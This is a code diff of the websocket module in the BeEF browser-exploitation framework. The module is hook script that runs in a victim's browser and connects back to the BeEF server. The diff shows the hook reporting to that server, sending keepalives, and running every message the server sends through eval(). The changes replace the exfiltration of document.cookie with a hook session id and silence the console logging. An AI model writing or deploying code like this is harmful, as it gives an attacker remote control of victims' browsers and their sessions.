@@ -36,35 +36,32 @@ beef.websocket = {
         }
 
     },
-    /*websocket send Helo to beef server and start async communication*/
+    /* send Helo message to the BeEF server and start async communication*/
     start:function () {
         new beef.websocket.init();
-        /*so the server is just up we need send helo id @todo insert browser ID where can i get them?*/
         this.socket.onopen = function () {
-            console.log("Socket has been opened!");
+            //console.log("Socket has been opened!");
 
             /*send browser id*/
-            beef.websocket.send('{"cookie":"' + document.cookie + '"}');
-            console.log("Connected and Helo");
+            beef.websocket.send('{"cookie":"' + beef.session.get_hook_session_id() + '"}');
+            //console.log("Connected and Helo");
             beef.websocket.alive();
         }
         this.socket.onmessage = function (message) {
-            console.log("Received message via WS."+ message.data);
-             eval(message.data);
+            //console.log("Received message via WS."+ message.data);
+            eval(message.data);
         }
 
     },
 
     send:function (data) {
         this.socket.send(data);
-        console.log("Sent [" + data + "]");
+//        console.log("Sent [" + data + "]");
     },
 
-    //todo antisnatchor: we need to get only the BEEFHOOK cookie value, not every cookie.
-    //todo in this way it will be easier to parse it server side.
     alive: function (){
         beef.websocket.send('{"alive":"'+beef.session.get_hook_session_id()+'"}');
-        console.log("sent alive");
+//        console.log("sent alive");
         setTimeout("beef.websocket.alive()", beef.websocket.alive_timer);
 
     }
